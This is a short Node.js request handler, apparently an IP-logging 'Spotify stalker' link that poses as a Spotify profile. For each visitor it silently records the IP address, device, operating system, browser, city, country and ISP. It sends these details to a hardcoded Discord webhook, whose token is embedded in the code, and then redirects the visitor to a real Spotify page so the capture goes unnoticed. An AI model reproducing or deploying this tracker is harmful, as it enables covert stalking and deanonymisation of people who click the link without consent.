const https = require('https');
const UAParser = require('ua-parser-js');

const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    https.get(url, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
    }).on('error', reject);
  });
}

function postJSON(url, payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const u = new URL(url);
    const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } };
    const req = https.request(opts, () => resolve());
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

module.exports = async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const uaStr = req.headers['user-agent'] || '';
    const referrer = req.headers['referer'] || 'Doğrudan';

    const parser = new UAParser(uaStr);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();

    let geo = {};
    try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,isp,org,as,query'); } catch(e) {}

    const lines = [
      '**SPOTIFY STALKERi !!!**',
      '',
      '**IP :** ' + ip,
      '**Konum :** ' + (geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor'),
      '**Linke Tıklanan Uygulama :** ' + referrer,
      '**Cihaz :** ' + (device.vendor || device.model || 'Bilinmiyor') + (device.model ? ' ' + device.model : ''),
      '**İşletim Sistemi :** ' + (os.name || 'Bilinmiyor') + (os.version ? ' ' + os.version : ''),
      '**Tarayıcı :** ' + (browser.name || 'Bilinmiyor') + (browser.version ? ' ' + browser.version : ''),
      '**ISS :** ' + (geo.isp || geo.org || 'Bilinmiyor'),
      '**Tarih :** ' + new Date().toLocaleString('tr-TR'),
      '',
      '                                                        made by wer1x'
    ];

    await postJSON(WEBHOOK, { content: lines.join('\n') });
  } catch(e) {}

  res.writeHead(302, { Location: REDIRECT });
  res.end();
};
